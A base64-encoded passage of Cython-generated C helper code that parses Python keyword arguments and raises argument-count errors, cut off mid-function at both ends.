G4gICAgUHlPYmplY3QgKiogY29uc3QgKm5hbWU7XG4gICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgICBQeV9oYXNoX3Qga2V5X2hhc2ggPSAoKFB5QVNDSUlPYmplY3QqKWtleSktPmhhc2g7XG4gICAgaWYgKHVubGlrZWx5KGtleV9oYXNoID09IC0xKSkge1xuICAgICAgICBrZXlfaGFzaCA9IFB5T2JqZWN0X0hhc2goa2V5KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGtleV9oYXNoID09IC0xKSlcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgIHdoaWxlICgqbmFtZSkge1xuICAgICAgICBQeU9iamVjdCAqbmFtZV9zdHIgPSAqKm5hbWU7XG4gICAgICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICAgICAgIGlmIChrZXlfaGFzaCA9PSAoKFB5QVNDSUlPYmplY3QqKW5hbWVfc3RyKS0+aGFzaCAmJiBfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChuYW1lX3N0ciwga2V5KSkge1xuICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7XG4gICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICAjZWxzZVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKFB5VW5pY29kZV9HRVRfTEVOR1RIKG5hbWVfc3RyKSA9PSBQeVVuaWNvZGVfR0VUX0xFTkdUSChrZXkpKVxuICAgICAgICAjZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgaW50IGNtcCA9IFB5VW5pY29kZV9Db21wYXJlKG5hbWVfc3RyLCBrZXkpO1xuICAgICAgICAgICAgaWYgKGNtcCA8IDAgJiYgdW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgaWYgKGNtcCA9PSAwKSB7XG4gICAgICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7XG4gICAgICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgbmFtZSA9IGFyZ25hbWVzO1xuICAgIHdoaWxlIChuYW1lICE9IGZpcnN0X2t3X2FyZykge1xuICAgICAgICBQeU9iamVjdCAqbmFtZV9zdHIgPSAqKm5hbWU7XG4gICAgICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTXG4gICAgICAgIGlmICh1bmxpa2VseShrZXlfaGFzaCA9PSAoKFB5QVNDSUlPYmplY3QqKW5hbWVfc3RyKS0+aGFzaCkpIHtcbiAgICAgICAgICAgIGlmIChfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChuYW1lX3N0ciwga2V5KSlcbiAgICAgICAgICAgICAgICBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7XG4gICAgICAgIH1cbiAgICAgICAgI2Vsc2VcbiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGlmIChQeVVuaWNvZGVfR0VUX0xFTkdUSChuYW1lX3N0cikgPT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoa2V5KSlcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShuYW1lX3N0ciA9PSBrZXkpKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7XG4gICAgICAgICAgICBpbnQgY21wID0gUHlVbmljb2RlX0NvbXBhcmUobmFtZV9zdHIsIGtleSk7XG4gICAgICAgICAgICBpZiAoY21wIDwgMCAmJiB1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7XG4gICAgICAgICAgICBpZiAoY21wID09IDApIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTtcbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbmFyZ19wYXNzZWRfdHdpY2U6XG4gICAgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7XG4gICAgZ290byBiYWQ7XG5iYWQ6XG4gICAgcmV0dXJuIC0xO1xufVxuc3RhdGljIGludCBfX1B5eF9NYXRjaEtleXdvcmRBcmdfbm9zdHIoXG4gICAgUHlPYmplY3QgKmtleSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsXG4gICAgc2l6ZV90ICppbmRleF9mb3VuZCxcbiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKVxue1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lO1xuICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSBnb3RvIGludmFsaWRfa2V5d29yZF90eXBlO1xuICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7XG4gICAgd2hpbGUgKCpuYW1lKSB7XG4gICAgICAgIGludCBjbXAgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woKipuYW1lLCBrZXksIFB5X0VRKTtcbiAgICAgICAgaWYgKGNtcCA9PSAxKSB7XG4gICAgICAgICAgICAqaW5kZXhfZm91bmQgPSAoc2l6ZV90KSAobmFtZSAtIGFyZ25hbWVzKTtcbiAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgIGlmICh1bmxpa2VseShjbXAgPT0gLTEpKSBnb3RvIGJhZDtcbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICBuYW1lID0gYXJnbmFtZXM7XG4gICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7XG4gICAgICAgIGludCBjbXAgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woKipuYW1lLCBrZXksIFB5X0VRKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGNtcCAhPSAwKSkge1xuICAgICAgICAgICAgaWYgKGNtcCA9PSAxKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7XG4gICAgICAgICAgICBlbHNlIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgcmV0dXJuIDA7XG5hcmdfcGFzc2VkX3R3aWNlOlxuICAgIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgIGdvdG8gYmFkO1xuaW52YWxpZF9rZXl3b3JkX3R5cGU6XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwcygpIGtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIsIGZ1bmN0aW9uX25hbWUpO1xuICAgIGdvdG8gYmFkO1xuYmFkOlxuICAgIHJldHVybiAtMTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9NYXRjaEtleXdvcmRBcmcoXG4gICAgUHlPYmplY3QgKmtleSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsXG4gICAgc2l6ZV90ICppbmRleF9mb3VuZCxcbiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKVxue1xuICAgIHJldHVybiBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3Qoa2V5KSkgP1xuICAgICAgICBfX1B5eF9NYXRjaEtleXdvcmRBcmdfc3RyKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpIDpcbiAgICAgICAgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX25vc3RyKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpO1xufVxuc3RhdGljIHZvaWQgX19QeXhfUmVqZWN0VW5rbm93bktleXdvcmQoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLFxuICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpXG57XG4gICAgUHlfc3NpemVfdCBwb3MgPSAwO1xuICAgIFB5T2JqZWN0ICprZXkgPSBOVUxMO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oa3dkcyk7XG4gICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3ZHMsICZwb3MsICZrZXksIE5VTEwpKSB7XG4gICAgICAgIFB5T2JqZWN0KiogY29uc3QgKm5hbWUgPSBmaXJzdF9rd19hcmc7XG4gICAgICAgIHdoaWxlICgqbmFtZSAmJiAoKipuYW1lICE9IGtleSkpIG5hbWUrKztcbiAgICAgICAgaWYgKCEqbmFtZSkge1xuICAgICAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICBQeV9JTkNSRUYoa2V5KTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgc2l6ZV90IGluZGV4X2ZvdW5kID0gMDtcbiAgICAgICAgICAgIGludCBjbXAgPSBfX1B5eF9NYXRjaEtleXdvcmRBcmcoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCAmaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpO1xuICAgICAgICAgICAgaWYgKGNtcCAhPSAxKSB7XG4gICAgICAgICAgICAgICAgaWYgKGNtcCA9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiJXMoKSBnb3QgYW4gdW5leHBlY3RlZCBrZXl3b3JkIGFyZ3VtZW50IFwnJVVcJyIsXG4gICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTtcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgUHlfREVDUkVGKGtleSk7XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgfVxuICAgIH1cbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIGFzc2VydChQeUVycl9PY2N1cnJlZCgpKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkRGljdChcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncyxcbiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSxcbiAgICBpbnQgaWdub3JlX3Vua25vd25fa3dhcmdzKVxue1xuICAgIFB5T2JqZWN0KiogY29uc3QgKm5hbWU7XG4gICAgUHlPYmplY3QqKiBjb25zdCAqZmlyc3Rfa3dfYXJnID0gYXJnbmFtZXMgKyBudW1fcG9zX2FyZ3M7XG4gICAgUHlfc3NpemVfdCBleHRyYWN0ZWQgPSAwO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgZGVmaW5lZChQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMpXG4gICAgaWYgKHVubGlrZWx5KCFQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMoa3dkcykpKSByZXR1cm4gLTE7XG4jZW5kaWZcbiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgIHdoaWxlICgqbmFtZSAmJiBudW1fa3dhcmdzID4gZXh0cmFjdGVkKSB7XG4gICAgICAgIFB5T2JqZWN0ICoga2V5ID0gKipuYW1lO1xuICAgICAgICBQeU9iamVjdCAqdmFsdWU7XG4gICAgICAgIGludCBmb3VuZCA9IDA7XG4gICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICAgICAgZm91bmQgPSBQeURpY3RfR2V0SXRlbVJlZihrd2RzLCBrZXksICZ2YWx1ZSk7XG4gICAgICAgICNlbHNlXG4gICAgICAgIHZhbHVlID0gUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3Ioa3dkcywga2V5KTtcbiAgICAgICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgICAgICAgICAgZm91bmQgPSAxO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgaWYgKGZvdW5kKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7XG4gICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTtcbiAgICAgICAgICAgIGV4dHJhY3RlZCsrO1xuICAgICAgICB9XG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgaWYgKG51bV9rd2FyZ3MgPiBleHRyYWN0ZWQpIHtcbiAgICAgICAgaWYgKGlnbm9yZV91bmtub3duX2t3YXJncykge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncyhrd2RzLCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBmdW5jdGlvbl9uYW1lKSA9PSAtMSkpXG4gICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBfX1B5eF9SZWplY3RVbmtub3duS2V5d29yZChrd2RzLCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBmdW5jdGlvbl9uYW1lKTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgfVxuICAgIHJldHVybiAwO1xuYmFkOlxuICAgIHJldHVybiAtMTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkRGljdFRvRGljdChcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICprd2RzMixcbiAgICBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSlcbntcbiAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lO1xuICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzO1xuICAgIFB5X3NzaXplX3QgbGVuO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgZGVmaW5lZChQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMpXG4gICAgaWYgKHVubGlrZWx5KCFQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMoa3dkcykpKSByZXR1cm4gLTE7XG4jZW5kaWZcbiAgICBpZiAoUHlEaWN0X1VwZGF0ZShrd2RzMiwga3dkcykgPCAwKSBnb3RvIGJhZDtcbiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgIHdoaWxlICgqbmFtZSkge1xuICAgICAgICBQeU9iamVjdCAqa2V5ID0gKipuYW1lO1xuICAgICAgICBQeU9iamVjdCAqdmFsdWU7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTIgfHwgZGVmaW5lZChQeURpY3RfUG9wKSlcbiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X1BvcChrd2RzMiwga2V5LCAmdmFsdWUpO1xuICAgICAgICBpZiAoZm91bmQpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShmb3VuZCA8IDApKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlO1xuICAgICAgICB9XG4jZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X0dldEl0ZW1SZWYoa3dkczIsIGtleSwgJnZhbHVlKTtcbiAgICAgICAgaWYgKGZvdW5kKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7XG4gICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfRGVsSXRlbShrd2RzMiwga2V5KSA8IDApKSBnb3RvIGJhZDtcbiAgICAgICAgfVxuI2Vsc2VcbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIHZhbHVlID0gX1B5RGljdF9Qb3Aoa3dkczIsIGtleSwga3dkczIpO1xuICAgICNlbHNlXG4gICAgICAgIHZhbHVlID0gX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMigmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AsIGt3ZHMyLCBrZXksIGt3ZHMyKTtcbiAgICAjZW5kaWZcbiAgICAgICAgaWYgKHZhbHVlID09IGt3ZHMyKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYodmFsdWUpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIGxlbiA9IFB5RGljdF9TaXplKGt3ZHMyKTtcbiAgICBpZiAobGVuID4gMCkge1xuICAgICAgICByZXR1cm4gX19QeXhfVmFsaWRhdGVEdXBsaWNhdGVQb3NBcmdzKGt3ZHMsIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGZ1bmN0aW9uX25hbWUpO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkobGVuID09IC0xKSkge1xuICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG5iYWQ6XG4gICAgcmV0dXJuIC0xO1xufVxuc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmRzVHVwbGUoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiBjb25zdCAqa3d2YWx1ZXMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqa3dkczIsXG4gICAgUHlPYmplY3QgKnZhbHVlc1tdLFxuICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLFxuICAgIFB5X3NzaXplX3QgbnVtX2t3YXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLFxuICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpXG57XG4gICAgUHlPYmplY3QgKmtleSA9IE5VTEw7XG4gICAgUHlPYmplY3QqKiBjb25zdCAqIG5hbWU7XG4gICAgUHlPYmplY3QqKiBjb25zdCAqZmlyc3Rfa3dfYXJnID0gYXJnbmFtZXMgKyBudW1fcG9zX2FyZ3M7XG4gICAgZm9yIChQeV9zc2l6ZV90IHBvcyA9IDA7IHBvcyA8IG51bV9rd2FyZ3M7IHBvcysrKSB7XG4jaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAga2V5ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKGt3ZHMsIHBvcyk7XG4jZWxzZVxuICAgICAgICBrZXkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3ZHMsIHBvcyk7XG4jZW5kaWZcbiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICBpZiAodW5saWtlbHkoIWtleSkpIGdvdG8gYmFkO1xuI2VuZGlmXG4gICAgICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7XG4gICAgICAgIHdoaWxlICgqbmFtZSAmJiAoKipuYW1lICE9IGtleSkpIG5hbWUrKztcbiAgICAgICAgaWYgKCpuYW1lKSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdO1xuICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gX19QeXhfTmV3UmVmKHZhbHVlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHNpemVfdCBpbmRleF9mb3VuZCA9IDA7XG4gICAgICAgICAgICBpbnQgY21wID0gX19QeXhfTWF0Y2hLZXl3b3JkQXJnKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgJmluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTtcbiAgICAgICAgICAgIGlmIChjbXAgPT0gMSkge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107XG4gICAgICAgICAgICAgICAgdmFsdWVzW2luZGV4X2ZvdW5kXSA9IF9fUHl4X05ld1JlZih2YWx1ZSk7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShjbXAgPT0gLTEpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICBpZiAoa3dkczIpIHtcbiAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKnZhbHVlID0ga3d2YWx1ZXNbcG9zXTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtKGt3ZHMyLCBrZXksIHZhbHVlKSkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoIWlnbm9yZV91bmtub3duX2t3YXJncykge1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGludmFsaWRfa2V5d29yZDtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIFB5X0RFQ1JFRihrZXkpO1xuICAgICAgICBrZXkgPSBOVUxMO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4gICAgcmV0dXJuIDA7XG5pbnZhbGlkX2tleXdvcmQ6XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiVzKCkgZ290IGFuIHVuZXhwZWN0ZWQga2V5d29yZCBhcmd1bWVudCBcJyVVXCciLFxuICAgICAgICBmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgIGdvdG8gYmFkO1xuYmFkOlxuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X1hERUNSRUYoa2V5KTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gLTE7XG59XG5zdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiBjb25zdCAqa3d2YWx1ZXMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqa3dkczIsXG4gICAgUHlPYmplY3QgKnZhbHVlc1tdLFxuICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLFxuICAgIFB5X3NzaXplX3QgbnVtX2t3YXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLFxuICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpXG57XG4gICAgaWYgKENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIGxpa2VseShQeVR1cGxlX0NoZWNrKGt3ZHMpKSlcbiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZHNUdXBsZShrd2RzLCBrd3ZhbHVlcywgYXJnbmFtZXMsIGt3ZHMyLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgbnVtX2t3YXJncywgZnVuY3Rpb25fbmFtZSwgaWdub3JlX3Vua25vd25fa3dhcmdzKTtcbiAgICBlbHNlIGlmIChrd2RzMilcbiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZERpY3RUb0RpY3Qoa3dkcywgYXJnbmFtZXMsIGt3ZHMyLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgZnVuY3Rpb25fbmFtZSk7XG4gICAgZWxzZVxuICAgICAgICByZXR1cm4gX19QeXhfUGFyc2VLZXl3b3JkRGljdChrd2RzLCBhcmduYW1lcywgdmFsdWVzLCBudW1fcG9zX2FyZ3MsIG51bV9rd2FyZ3MsIGZ1bmN0aW9uX25hbWUsIGlnbm9yZV91bmtub3duX2t3YXJncyk7XG59XG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoXG4gICAgY29uc3QgY2hhciogZnVuY19uYW1lLFxuICAgIGludCBleGFjdCxcbiAgICBQeV9zc2l6ZV90IG51bV9taW4sXG4gICAgUHlfc3NpemVfdCBudW1fbWF4LFxuICAgIFB5X3NzaXplX3QgbnVtX2ZvdW5kKVxue1xuICAgIFB5X3NzaXplX3QgbnVtX2V4cGVjdGVkO1xuICAgIGNvbnN0IGNoYXIgKm1vcmVfb3JfbGVzcztcbiAgICBpZiAobnVtX2ZvdW5kIDwgbnVtX21pbikge1xuICAgICAgICBudW1fZXhwZWN0ZWQgPSBudW1fbWluO1xuICAgICAgICBtb3JlX29yX2xlc3MgPSAiYXQgbGVhc3QiO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIG51bV9leHBlY3RlZCA9IG51bV9tYXg7XG4gICAgICAgIG1vcmVfb3JfbGVzcyA9ICJhdCBtb3N0IjtcbiAgICB9XG4gICAgaWYgKGV4YWN0KSB7XG4gICAgICAgIG1vcmVfb3JfbGVzcyA9ICJleGFjdGx5IjtcbiAgICB9XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgIiUuMjAwcygpIHRha2VzICUuOHMgJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIHBvc2l0aW9uYWwgYXJndW1lbnQlLjFzICglIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgZ2l2ZW4pIixcbiAgICAgICAgICAgICAgICAgZnVuY19uYW1lLCBtb3JlX29yX2xlc3MsIG51bV9leHBlY3RlZCxcbiAgICAgICAgICAgICAgICAgKG51bV9leHBlY3RlZCA9PSAxKSA/ICIiIDogInMiLCBudW1fZm91bmQpO1xufVxuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGludCBpbnBsYWNlKSB7XG4gICAgcmV0dXJuIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZUFkZCA6IFB5TnVtYmVyX0FkZCkob3AxLCBvcDIpO1xufVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnBsYWNlKTtcbiAgICBDWVRIT05fVU5VU0VEX1